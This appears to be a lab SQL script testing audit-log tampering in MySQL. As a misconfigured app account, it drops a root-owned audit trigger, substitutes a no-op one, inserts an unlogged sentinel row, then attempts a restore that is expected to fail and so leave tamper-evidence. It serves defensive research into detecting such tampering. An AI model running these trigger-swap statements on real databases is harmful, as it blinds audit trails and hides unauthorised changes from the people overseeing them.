-- atk_1c.sql — replace/drop the audit trigger (MySQL analogue of PG Vector 1C).
-- Run as app_user. Precondition: app_user holds TRIGGER privilege on labdb.app_accounts
-- (granted by the orchestrator to model the misconfig where the app account owns/controls
-- its schema). Blind by swapping the DEFINER=root logging trigger for a no-op the app owns.
DROP TRIGGER IF EXISTS labdb.accounts_ai;
CREATE DEFINER=CURRENT_USER TRIGGER labdb.accounts_ai AFTER INSERT ON labdb.app_accounts
FOR EACH ROW SET @noop = 1;                       -- logs nothing; needs no audit privilege
-- blinded write:
INSERT INTO labdb.app_accounts(holder,balance_cents) VALUES ('sentinel-1C',100);

-- Attempt a FAITHFUL restore to the original root-DEFINER trigger. app_user cannot set
-- DEFINER=root without SET USER / SUPER, so this is expected to FAIL — the DEFINER change
-- is a residue the attacker cannot erase (stronger tamper-evidence than PostgreSQL).
DROP TRIGGER IF EXISTS labdb.accounts_ai;
CREATE DEFINER=`root`@`localhost` TRIGGER labdb.accounts_ai AFTER INSERT ON labdb.app_accounts
FOR EACH ROW
  INSERT INTO labdb.audit_logged_actions(table_name,action,row_data,changed_by,client_host)
  VALUES('app_accounts','I',
         JSON_OBJECT('id',NEW.id,'holder',NEW.holder,'balance_cents',NEW.balance_cents),
         USER(), @@hostname);
-- control write after the (attempted) restore:
INSERT INTO labdb.app_accounts(holder,balance_cents) VALUES ('sentinel-1C-ctl',101);
